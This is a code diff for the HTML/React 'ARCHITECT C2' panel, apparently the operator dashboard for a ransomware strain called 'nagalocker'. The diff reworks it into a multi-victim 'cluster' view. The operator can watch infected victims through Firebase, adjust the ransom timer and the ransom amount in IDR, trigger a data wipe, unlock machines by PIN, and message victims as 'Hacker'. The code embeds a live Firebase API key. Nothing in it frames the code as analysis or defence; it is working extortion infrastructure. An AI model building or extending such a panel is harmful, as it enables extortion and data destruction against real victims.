@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ARCHITECT C2 - Admin Dashboard</title>
+    <title>ARCHITECT C2 - Cluster Dashboard</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <script src="https://unpkg.com/lucide@latest"></script>
     <script src="https://unpkg.com/react@18/umd/react.production.min.js"></script>
@@ -21,9 +21,9 @@
     <div id="root"></div>
 
     <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getFirestore, doc, onSnapshot, updateDoc, arrayUnion, arrayRemove, setDoc, getDoc } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";
-        import { getAuth, signInAnonymously, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+        import { getFirestore, collection, onSnapshot, doc, updateDoc, arrayUnion, arrayRemove, setDoc, query } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
+        import { getAuth, signInAnonymously } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyAZ98XegiDOAGJ508mCASQ1SKp-3WsonWU",
@@ -37,8 +37,8 @@
 
         window.FirebaseLib = {
             app: initializeApp(firebaseConfig),
-            getFirestore, doc, onSnapshot, updateDoc, arrayUnion, arrayRemove, setDoc, getDoc,
-            getAuth, signInAnonymously, onAuthStateChanged
+            getFirestore, collection, onSnapshot, doc, updateDoc, arrayUnion, arrayRemove, setDoc, query,
+            getAuth, signInAnonymously
         };
         window.dispatchEvent(new Event('firebase-ready'));
     </script>
@@ -48,15 +48,11 @@
 
         function App() {
             const [fbReady, setFbReady] = useState(false);
-            const [user, setUser] = useState(null);
-            const [state, setState] = useState({
-                timeLeft: 1800, ransom: '300.000', messages: [],
-                isWiping: false, isLocked: true, validPins: []
-            });
+            const [victims, setVictims] = useState([]);
+            const [activeVictimId, setActiveVictimId] = useState(null);
+            const [activeData, setActiveData] = useState(null);
             const [input, setInput] = useState('');
             const [newPin, setNewPin] = useState('');
-            
-            const docPath = ["artifacts", "nagalocker", "public", "data", "locker_state", "current"];
 
             useEffect(() => {
                 const handleReady = () => setFbReady(true);
@@ -66,142 +62,160 @@
 
             useEffect(() => {
                 if (!fbReady) return;
-                const { getAuth, signInAnonymously, getFirestore, doc, onSnapshot } = window.FirebaseLib;
+                const { getAuth, signInAnonymously, getFirestore, collection, onSnapshot, query } = window.FirebaseLib;
                 signInAnonymously(getAuth());
-                const db = getFirestore();
-                const docRef = doc(db, ...docPath);
-
-                return onSnapshot(docRef, (s) => s.exists() && setState(s.data()));
+                
+                // Real-time listener for ALL victims
+                const colRef = collection(getFirestore(), "artifacts", "nagalocker", "public", "data", "victims");
+                return onSnapshot(colRef, (snapshot) => {
+                    const list = snapshot.docs.map(doc => doc.data());
+                    setVictims(list);
+                });
             }, [fbReady]);
 
+            useEffect(() => {
+                if (!activeVictimId || !fbReady) return;
+                const { getFirestore, doc, onSnapshot } = window.FirebaseLib;
+                const docRef = doc(getFirestore(), "artifacts", "nagalocker", "public", "data", "victims", activeVictimId);
+                return onSnapshot(docRef, (s) => s.exists() && setActiveData(s.data()));
+            }, [activeVictimId, fbReady]);
+
             const updateField = async (field, value) => {
+                if (!activeVictimId) return;
                 const { getFirestore, doc, updateDoc } = window.FirebaseLib;
-                const db = getFirestore();
-                await updateDoc(doc(db, ...docPath), { [field]: value });
+                await updateDoc(doc(getFirestore(), "artifacts", "nagalocker", "public", "data", "victims", activeVictimId), { [field]: value });
             };
 
             const addPin = async () => {
                 if (!newPin.trim()) return;
                 const { getFirestore, doc, updateDoc, arrayUnion } = window.FirebaseLib;
-                const db = getFirestore();
-                await updateDoc(doc(db, ...docPath), {
-                    validPins: arrayUnion(newPin)
-                });
+                await updateDoc(doc(getFirestore(), "artifacts", "nagalocker", "public", "data", "victims", activeVictimId), { validPins: arrayUnion(newPin) });
                 setNewPin('');
-            };
-
-            const removePin = async (pin) => {
-                const { getFirestore, doc, updateDoc, arrayRemove } = window.FirebaseLib;
-                const db = getFirestore();
-                await updateDoc(doc(db, ...docPath), {
-                    validPins: arrayRemove(pin)
-                });
             };
 
             const sendMsg = async () => {
                 if (!input.trim()) return;
                 const { getFirestore, doc, updateDoc, arrayUnion } = window.FirebaseLib;
-                const db = getFirestore();
-                await updateDoc(doc(db, ...docPath), {
+                await updateDoc(doc(getFirestore(), "artifacts", "nagalocker", "public", "data", "victims", activeVictimId), {
                     messages: arrayUnion({ sender: 'Hacker', text: input, time: Date.now() })
                 });
                 setInput('');
             };
 
-            useEffect(() => { window.lucide && lucide.createIcons(); }, [state]);
-
-            if (!fbReady) return <div className="min-h-screen bg-slate-950 flex items-center justify-center text-slate-500 font-orbit">ESTABLISHING C2...</div>;
+            if (!fbReady) return <div className="min-h-screen bg-slate-950 flex items-center justify-center text-slate-500 font-orbit">ESTABLISHING C2 CLUSTER...</div>;
 
             return (
-                <div className="min-h-screen p-4 lg:p-8 flex flex-col max-w-7xl mx-auto">
-                    <header className="flex justify-between items-center glass p-6 rounded-[2rem] mb-8 shadow-2xl border border-slate-800">
-                        <div className="flex items-center gap-4">
-                            <div className="bg-red-600 p-3 rounded-2xl"><i data-lucide="user-cog" className="text-white w-8 h-8"></i></div>
-                            <div>
-                                <h1 className="text-2xl font-black text-white italic tracking-tighter font-orbit uppercase">Architect C2</h1>
-                                <p className="text-[10px] text-slate-500 uppercase font-black">Node: <span className="text-green-500">ACTIVE</span></p>
-                            </div>
+                <div className="min-h-screen flex flex-col lg:flex-row">
+                    {/* Sidebar: Victim List */}
+                    <aside className="w-full lg:w-80 bg-slate-900 border-r border-slate-800 p-6 overflow-y-auto">
+                        <div className="flex items-center gap-3 mb-10">
+                            <div className="bg-red-600 p-2 rounded-xl shadow-lg shadow-red-900/20"><i data-lucide="shield-alert" className="text-white w-6 h-6"></i></div>
+                            <h1 className="text-xl font-black italic tracking-tighter font-orbit">C2 CLUSTER</h1>
                         </div>
-                        <div className="text-right">
-                            <p className="text-[10px] text-slate-500 font-bold uppercase">Target OS</p>
-                            <p className={`text-xs font-black font-orbit ${state.isLocked ? 'text-red-500' : 'text-green-500'}`}>{state.isLocked ? 'LOCKED' : 'DECRYPTED'}</p>
+                        <h2 className="text-[10px] font-black text-slate-500 uppercase tracking-widest mb-4">Victim Nodes ({victims.length})</h2>
+                        <div className="space-y-2">
+                            {victims.map((v) => (
+                                <button 
+                                    key={v.id} 
+                                    onClick={() => setActiveVictimId(v.id)}
+                                    className={`w-full p-4 rounded-xl flex items-center justify-between transition-all ${activeVictimId === v.id ? 'bg-red-600 text-white shadow-lg' : 'bg-black/40 text-slate-400 hover:bg-slate-800'}`}
+                                >
+                                    <div className="text-left">
+                                        <p className="text-xs font-black font-mono">{v.id}</p>
+                                        <p className="text-[8px] uppercase opacity-50">{v.isLocked ? 'Encrypted' : 'Decrypted'}</p>
+                                    </div>
+                                    <div className={`w-2 h-2 rounded-full ${Date.now() - v.lastSeen < 10000 ? 'bg-green-500 animate-pulse' : 'bg-slate-700'}`}></div>
+                                </button>
+                            ))}
                         </div>
-                    </header>
+                    </aside>
 
-                    <div className="grid grid-cols-1 lg:grid-cols-3 gap-8 flex-1">
-                        <div className="lg:col-span-2 space-y-6">
-                            <section className="glass p-8 rounded-[2.5rem] shadow-xl">
-                                <h2 className="text-xs font-black text-slate-500 uppercase tracking-widest mb-8 flex items-center gap-2">
-                                    <i data-lucide="zap" className="w-4 h-4"></i> Remote Payload
-                                </h2>
-                                <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-8">
-                                    <div className="bg-black/40 p-6 rounded-3xl border border-slate-800">
-                                        <p className="text-[10px] text-slate-500 mb-2 font-bold uppercase">Time Left (Mins)</p>
-                                        <div className="flex items-center justify-between">
-                                            <span className="text-2xl font-black text-red-500 font-orbit">{Math.floor(state.timeLeft / 60)}m</span>
-                                            <div className="flex gap-2">
-                                                <button onClick={() => updateField('timeLeft', Math.max(0, state.timeLeft - 300))} className="p-2 bg-slate-800 rounded-lg hover:bg-red-900/40">-5</button>
-                                                <button onClick={() => updateField('timeLeft', state.timeLeft + 300)} className="p-2 bg-slate-800 rounded-lg hover:bg-green-900/40">+5</button>
+                    {/* Main Content: Control Panel */}
+                    <main className="flex-1 p-4 lg:p-10 bg-black overflow-y-auto">
+                        {!activeVictimId ? (
+                            <div className="h-full flex flex-col items-center justify-center text-slate-600">
+                                <i data-lucide="mouse-pointer-2" className="w-12 h-12 mb-4 opacity-20"></i>
+                                <p className="font-black italic uppercase tracking-widest text-sm">Pilih node untuk memulai kendali</p>
+                            </div>
+                        ) : activeData && (
+                            <div className="space-y-8 animate-in fade-in slide-in-from-bottom-4 duration-500">
+                                <header className="flex justify-between items-center glass p-6 rounded-3xl border border-slate-800 shadow-2xl">
+                                    <div>
+                                        <h2 className="text-2xl font-black text-white italic font-orbit uppercase tracking-tighter">TARGET: {activeVictimId}</h2>
+                                        <p className="text-[10px] text-slate-500 uppercase font-black">Cluster Node Synchronization: <span className="text-green-500">STABLE</span></p>
+                                    </div>
+                                    <div className="text-right">
+                                        <p className="text-[10px] text-slate-500 font-bold uppercase">Target Status</p>
+                                        <p className={`text-xs font-black font-orbit ${activeData.isLocked ? 'text-red-500' : 'text-green-500'}`}>{activeData.isLocked ? 'ENCRYPTED' : 'DECRYPTED'}</p>
+                                    </div>
+                                </header>
+
+                                <div className="grid grid-cols-1 lg:grid-cols-2 gap-8">
+                                    <div className="space-y-6">
+                                        <section className="glass p-8 rounded-[2.5rem] shadow-xl">
+                                            <h3 className="text-xs font-black text-slate-500 uppercase tracking-widest mb-8">Payload Control</h3>
+                                            <div className="grid grid-cols-2 gap-6 mb-8">
+                                                <div className="bg-black/40 p-5 rounded-3xl border border-slate-800">
+                                                    <p className="text-[9px] text-slate-500 mb-2 uppercase font-black">Timer (Mins)</p>
+                                                    <div className="flex items-center justify-between">
+                                                        <span className="text-xl font-bold text-red-500 font-orbit">{Math.floor(activeData.timeLeft/60)}m</span>
+                                                        <div className="flex gap-1">
+                                                            <button onClick={() => updateField('timeLeft', Math.max(0, activeData.timeLeft - 300))} className="p-2 bg-slate-800 rounded-lg hover:bg-red-900/40">-</button>
+                                                            <button onClick={() => updateField('timeLeft', activeData.timeLeft + 300)} className="p-2 bg-slate-800 rounded-lg hover:bg-green-900/40">+</button>
+                                                        </div>
+                                                    </div>
+                                                </div>
+                                                <div className="bg-black/40 p-5 rounded-3xl border border-slate-800">
+                                                    <p className="text-[9px] text-slate-500 mb-2 uppercase font-black">Ransom (IDR)</p>
+                                                    <input className="bg-transparent border-b border-slate-700 w-full text-lg font-bold text-white outline-none focus:border-red-600" value={activeData.ransom} onChange={(e) => updateField('ransom', e.target.value)} />
+                                                </div>
                                             </div>
-                                        </div>
-                                    </div>
-                                    <div className="bg-black/40 p-6 rounded-3xl border border-slate-800">
-                                        <p className="text-[10px] text-slate-500 mb-2 font-bold uppercase tracking-widest">Ransom Price</p>
-                                        <input className="bg-transparent border-b border-slate-700 w-full text-xl font-black text-white outline-none focus:border-red-600 font-orbit" value={state.ransom} onChange={(e) => updateField('ransom', e.target.value)} />
-                                    </div>
-                                </div>
-                                <div className="grid grid-cols-2 gap-4">
-                                    <button onClick={() => updateField('isWiping', !state.isWiping)} className={`py-5 rounded-2xl font-black text-xs transition-all uppercase tracking-widest ${state.isWiping ? 'bg-red-600 animate-pulse text-white' : 'bg-slate-800 text-red-500 hover:bg-red-600 hover:text-white'}`}>
-                                        {state.isWiping ? 'Stop Wiping' : 'Execute Wipe'}
-                                    </button>
-                                    <button onClick={() => updateField('isLocked', !state.isLocked)} className={`py-5 rounded-2xl font-black text-xs transition-all uppercase tracking-widest ${state.isLocked ? 'bg-slate-800 text-green-500 hover:bg-green-600 hover:text-white' : 'bg-green-600 text-black'}`}>
-                                        {state.isLocked ? 'Force Unlock' : 'Re-Lock'}
-                                    </button>
-                                </div>
-                            </section>
+                                            <div className="grid grid-cols-2 gap-4">
+                                                <button onClick={() => updateField('isWiping', !activeData.isWiping)} className={`py-5 rounded-2xl font-black text-xs transition-all uppercase tracking-widest ${activeData.isWiping ? 'bg-red-600 animate-pulse text-white' : 'bg-slate-800 text-red-500'}`}>Execute Wipe</button>
+                                                <button onClick={() => updateField('isLocked', !activeData.isLocked)} className={`py-5 rounded-2xl font-black text-xs transition-all uppercase tracking-widest ${activeData.isLocked ? 'bg-slate-800 text-green-500' : 'bg-green-600 text-black'}`}>Force Unlock</button>
+                                            </div>
+                                        </section>
 
-                            <section className="glass p-8 rounded-[2.5rem] shadow-xl">
-                                <h2 className="text-xs font-black text-slate-500 uppercase tracking-widest mb-6">Database PIN (Multi-Access)</h2>
-                                <div className="flex gap-2 mb-6">
-                                    <input value={newPin} onChange={(e) => setNewPin(e.target.value)} placeholder="Input PIN Baru..." className="flex-1 bg-black/50 border border-slate-800 p-4 rounded-xl text-white outline-none focus:border-green-600 font-mono" />
-                                    <button onClick={addPin} className="bg-green-600 text-black px-8 rounded-xl font-black text-xs uppercase shadow-lg shadow-green-900/20">Tambah</button>
-                                </div>
-                                <div className="flex flex-wrap gap-2 max-h-40 overflow-y-auto scrollbar-hide">
-                                    {state.validPins && state.validPins.map((p, i) => (
-                                        <div key={i} className="bg-slate-800 border border-slate-700 px-4 py-2 rounded-lg flex items-center gap-4 text-xs font-black group">
-                                            <span className="text-green-500 font-mono">{p}</span>
-                                            <button onClick={() => removePin(p)} className="text-red-500 opacity-30 group-hover:opacity-100 transition-opacity">×</button>
-                                        </div>
-                                    ))}
-                                    {(!state.validPins || state.validPins.length === 0) && <p className="text-[10px] text-slate-600 italic">Database PIN kosong. Target tidak bisa unlock.</p>}
-                                </div>
-                            </section>
-                        </div>
-
-                        <div className="glass p-6 rounded-[2.5rem] flex flex-col h-[600px] shadow-2xl">
-                            <h2 className="text-xs font-black text-slate-500 uppercase tracking-widest mb-6 p-2 flex items-center gap-2">
-                                <i data-lucide="message-square" className="w-4 h-4 text-red-500"></i> Victim Comms
-                            </h2>
-                            <div className="flex-1 overflow-y-auto mb-6 space-y-4 bg-black/30 p-4 rounded-3xl border border-slate-800/30 scrollbar-hide text-[11px]">
-                                {state.messages && state.messages.map((m, i) => (
-                                    <div key={i} className={`flex flex-col ${m.sender === 'Hacker' ? 'items-end' : 'items-start'}`}>
-                                        <div className={`max-w-[85%] p-3 rounded-2xl ${m.sender === 'Hacker' ? 'bg-red-600 text-white shadow-lg shadow-red-900/20' : 'bg-slate-800 text-slate-200 border border-slate-700'}`}>
-                                            {m.text}
-                                        </div>
-                                        <span className="text-[8px] text-slate-600 mt-1 uppercase font-black tracking-tighter mx-2">{m.sender}</span>
+                                        <section className="glass p-8 rounded-[2.5rem] shadow-xl">
+                                            <h3 className="text-xs font-black text-slate-500 uppercase tracking-widest mb-6">Unique PINs</h3>
+                                            <div className="flex gap-2 mb-6">
+                                                <input value={newPin} onChange={(e) => setNewPin(e.target.value)} placeholder="New Key..." className="flex-1 bg-black/50 border border-slate-800 p-4 rounded-xl text-white outline-none focus:border-green-600 font-mono" />
+                                                <button onClick={addPin} className="bg-green-600 text-black px-8 rounded-xl font-black text-xs uppercase">ADD</button>
+                                            </div>
+                                            <div className="flex flex-wrap gap-2 max-h-32 overflow-y-auto scrollbar-hide">
+                                                {activeData.validPins && activeData.validPins.map((p, i) => (
+                                                    <div key={i} className="bg-slate-800 px-4 py-2 rounded-lg text-xs font-black text-green-500 font-mono border border-slate-700">{p}</div>
+                                                ))}
+                                            </div>
+                                        </section>
                                     </div>
-                                ))}
+
+                                    <div className="glass p-6 rounded-[2.5rem] flex flex-col h-[600px] shadow-2xl">
+                                        <h3 className="text-xs font-black text-slate-500 uppercase tracking-widest mb-6 flex items-center gap-2 p-2">
+                                            <i data-lucide="message-square" className="w-4 h-4 text-red-500"></i> Victim Comms Log
+                                        </h3>
+                                        <div className="flex-1 overflow-y-auto mb-6 space-y-4 bg-black/30 p-4 rounded-3xl border border-slate-800/30 scrollbar-hide text-[11px]">
+                                            {activeData.messages && activeData.messages.map((m, i) => (
+                                                <div key={i} className={`flex flex-col ${m.sender === 'Hacker' ? 'items-end' : 'items-start'}`}>
+                                                    <div className={`max-w-[85%] p-3 rounded-2xl ${m.sender === 'Hacker' ? 'bg-red-600 text-white shadow-lg shadow-red-900/30' : 'bg-slate-800 text-slate-200 border border-slate-700'}`}>
+                                                        {m.text}
+                                                    </div>
+                                                    <span className="text-[8px] text-slate-600 mt-1 uppercase font-black tracking-tighter mx-2">{m.sender}</span>
+                                                </div>
+                                            ))}
+                                        </div>
+                                        <div className="flex gap-2">
+                                            <input value={input} onChange={(e) => setInput(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && sendMsg()} placeholder="Transmit message..." className="flex-1 bg-black border border-slate-800 p-4 text-xs rounded-2xl outline-none text-white focus:border-red-600 transition-all shadow-inner" />
+                                            <button onClick={sendMsg} className="bg-red-600 p-4 rounded-2xl hover:bg-red-700 transition-all"><i data-lucide="send" className="text-white w-5 h-5"></i></button>
+                                        </div>
+                                    </div>
+                                </div>
                             </div>
-                            <div className="flex gap-2">
-                                <input value={input} onChange={(e) => setInput(e.target.value)} onKeyDown={(e) => e.key === 'Enter' && sendMsg()} placeholder="Ketik balasan..." className="flex-1 bg-black border border-slate-800 p-4 text-xs rounded-2xl outline-none text-white focus:border-red-600 transition-all shadow-inner" />
-                                <button onClick={sendMsg} className="bg-red-600 p-4 rounded-2xl hover:bg-red-700 transition-all active:scale-95 shadow-lg"><i data-lucide="send" className="text-white w-5 h-5"></i></button>
-                            </div>
-                        </div>
-                    </div>
+                        )}
+                    </main>
                 </div>
             );
         }
-
         ReactDOM.createRoot(document.getElementById('root')).render(<App />);
         setInterval(() => window.lucide && lucide.createIcons(), 1000);
     </script>
